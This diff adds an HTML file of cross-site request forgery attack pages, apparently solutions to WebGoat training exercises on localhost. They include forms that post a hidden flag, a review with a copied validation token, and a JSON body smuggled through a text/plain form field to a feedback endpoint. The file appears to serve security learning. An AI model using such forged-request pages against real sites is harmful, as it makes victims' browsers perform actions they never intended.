@@ -1,0 +1,37 @@
+<!--<html>
+	<head></head>
+	<body>
+		<form method="POST" target="_blank" action="http://127.0.0.1:8080/WebGoat/csrf/basic-get-flag">
+			<input name="csrf" type="hidden" value="true">
+			<input type="submit" name="submit">
+		</form>
+	</body>
+</html>-->
+
+
+<!--<html>
+	<head></head>
+	<body>
+		<div class="input-group">
+			<form class="attack-form" method="POST" action="http://127.0.0.1:8080/WebGoat/csrf/review">
+				<input name="reviewText" placeholder="Add a Review" type="text">
+				<input name="stars" type="text">
+				<input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+				<input type="submit" name="submit" value="Submit review">
+			</form>
+		</div>
+	</body>
+</html>-->
+
+
+<html>
+	<head></head>
+	<body>
+		<form method="POST" action="http://127.0.0.1:8080/WebGoat/csrf/feedback/message" enctype="text/plain">
+			<input name='{"name":"WebGoat","email":"webgoat@webgoat.org","content":"WebGoat is the best!!","test":"'value='test"}' type='hidden'>
+            <button>
+                Send Message
+            </button>
+        </form>
+	</body>
+</html>
